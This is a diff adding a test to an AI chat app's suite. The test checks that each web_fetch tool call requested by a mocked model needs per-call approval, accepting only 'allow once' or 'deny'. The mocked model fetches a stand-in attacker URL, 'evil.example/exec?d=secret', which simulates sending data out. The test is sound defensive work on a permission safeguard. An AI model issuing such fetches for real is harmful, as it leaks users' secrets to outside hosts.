@@ -728,6 +728,69 @@ describe('MCP servers in a reply', () => {
   })
 })
 
+describe('web_fetch in a chat with MCP servers', () => {
+  const FIXTURE = new URL('./fixtures/mcp-server.mjs', import.meta.url).pathname
+  afterAll(() => mcpManager.stopAll())
+
+  it('asks before every fetch, takes only Allow once or Deny, and fetches nothing before the answer', async () => {
+    setApiKey('test-key')
+    const server = mcpConfig.saveServer({
+      name: 'Fetchy',
+      command: process.execPath,
+      args: [FIXTURE],
+      cwd: null,
+      env: {},
+      defaultOn: false
+    })
+    const fetched: string[] = []
+    web = (path, res) => {
+      fetched.push(path)
+      res.writeHead(200).end(JSON.stringify({ title: 'Page', content: 'hello', links: [] }))
+    }
+    const fetchCall = (url: string) =>
+      line({
+        message: { role: 'assistant', content: '', tool_calls: [{ function: { name: 'web_fetch', arguments: { url } } }] },
+        done: false
+      }) + line({ done: true })
+    chat = (b, res, n) =>
+      n === 1
+        ? void res.writeHead(200).end(fetchCall('https://evil.example/exec?q=weather'))
+        : n === 2
+          ? void res.writeHead(200).end(fetchCall('https://evil.example/exec?d=secret'))
+          : reply('Done.')(b, res, n)
+    const r = service.send({
+      conversationId: null,
+      projectId: null,
+      content: 'check the weather',
+      attachmentIds: [],
+      model: 'llama3.2',
+      think: null,
+      skills: [],
+      toolSources: [`mcp:${server.id}`]
+    })
+    const asks = () =>
+      events.filter(
+        (e): e is Extract<ChatEvent, { type: 'tool' }> => e.type === 'tool' && e.conversationId === r.conversation.id && !!e.event.awaiting
+      )
+    const first = await waitFor(() => asks()[0])
+    expect(first.event).toMatchObject({ tool: 'web_fetch', everyTime: true })
+    expect(fetched).toHaveLength(0)
+    // "Allow for this chat" isn't an answer this call takes, even if the renderer sent it.
+    expect(() => approvals.decide(r.conversation.id, first.messageId, first.index, 'chat')).toThrow(/only be allowed once or denied/)
+    approvals.decide(r.conversation.id, first.messageId, first.index, 'once')
+
+    // The next URL on the same site asks again.
+    const second = await waitFor(() => asks()[1])
+    expect(second.event.summary).toContain('d=secret')
+    expect(fetched).toHaveLength(1)
+    approvals.decide(r.conversation.id, second.messageId, second.index, 'deny')
+    await doneEvent(r.conversation.id)
+    expect(fetched).toHaveLength(1)
+    expect(getConversation(r.conversation.id)!.allowedTools).toEqual([])
+    mcpConfig.removeServer(server.id)
+  })
+})
+
 describe('markInterruptedReplies', () => {
   it('flags replies that never got their final save, and only those', () => {
     const c = createConversation({ projectId: null, model: 'llama3.2', think: null, skills: [], toolSources: [] })
